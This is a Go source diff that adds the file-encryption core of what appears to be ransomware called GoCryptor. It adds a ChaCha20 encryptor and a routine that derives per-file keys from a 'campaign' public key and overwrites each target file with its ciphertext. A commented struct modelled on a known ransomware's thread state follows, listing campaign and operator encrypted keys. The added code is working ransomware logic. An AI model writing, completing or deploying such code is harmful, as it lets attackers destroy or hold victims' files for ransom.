@@ -1,9 +1,13 @@
 package main
 
 import (
+	"fmt"
 	"hash/crc32"
+	"io/fs"
 	"math/rand"
+	"os"
 
+	"golang.org/x/crypto/chacha20"
 	"golang.org/x/crypto/curve25519"
 )
 
@@ -57,3 +61,66 @@ func crc32Checksum(input []byte, polynomial uint32) uint32 {
 	crc32q := crc32.MakeTable(polynomial)
 	return crc32.Checksum(input, crc32q)
 }
+
+func chacha20Encryptor(input []byte, key []byte, nonce []byte) ([]byte, error) {
+	chacha20Cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
+
+	if err != nil {
+		return nil, err
+	}
+	var output []byte = make([]byte, len(input))
+	chacha20Cipher.XORKeyStream(output, input)
+	return output, nil
+}
+
+func encryptFileFull(filePath string, fileInfo fs.FileInfo) {
+	var filePrivateKey [32]byte
+	copy(filePrivateKey[:], generateRandomBuffer(32))
+	filePublicKey := generatePublicKey(filePrivateKey)
+
+	sharedSecret := generateSharedSecret(filePrivateKey, GoCryptorConfig.campaignKey)
+
+	fmt.Println("Public key: ", filePublicKey)
+	fmt.Println("Shared secret: ", sharedSecret)
+
+	fileNonce := generateRandomBuffer(24)
+	fmt.Println("Nonce: ", fileNonce)
+
+	fileBuffer, _ := os.ReadFile(filePath)
+	fmt.Println("Buffer: ", len(fileBuffer))
+
+	encryptedFileBytes, _ := chacha20Encryptor(fileBuffer, sharedSecret, fileNonce) // TODO: Make this safer
+
+	file, _ := os.Create(filePath)
+	defer file.Close()
+
+	file.Write(encryptedFileBytes)
+
+}
+
+// struct THREAD_STRUCT
+// {
+//   HANDLE HeapHandle;
+//   HANDLE IOCompletionPort;
+//   DWORD threadCount;
+//   LONG unused; // these fields are left unused for some reason.
+//   LONG unused2; // Or maybe I'm just blind lmao
+//   HANDLE fileHandle;
+//   DWORD fileName;
+//   LONG unused3;
+//   LONG lowerFileEncryptedSize;
+//   LONG higherFileEncryptedSize;
+//   BYTE CAMPAIGN_ENCRYPTED_PRIV_SYS_KEY[88];
+//   BYTE OPERATOR_ENCRYPTED_PRIV_SYS_KEY[88];
+//   BYTE filePublicKey[32];
+//   BYTE Salsa20Nonce[8];
+//   DWORD filePublicKeyCRC32Hash;
+//   DWORD encryptionType;
+//   DWORD SPSIZE;
+//   DWORD Salsa20XorStream;
+//   BYTE Salsa20Key[64];
+//   DWORD threadCurrentState;
+//   DWORD threadNextState;
+//   DWORD fileBufferReadLength;
+//   DWORD fileDataBuffer;
+// };
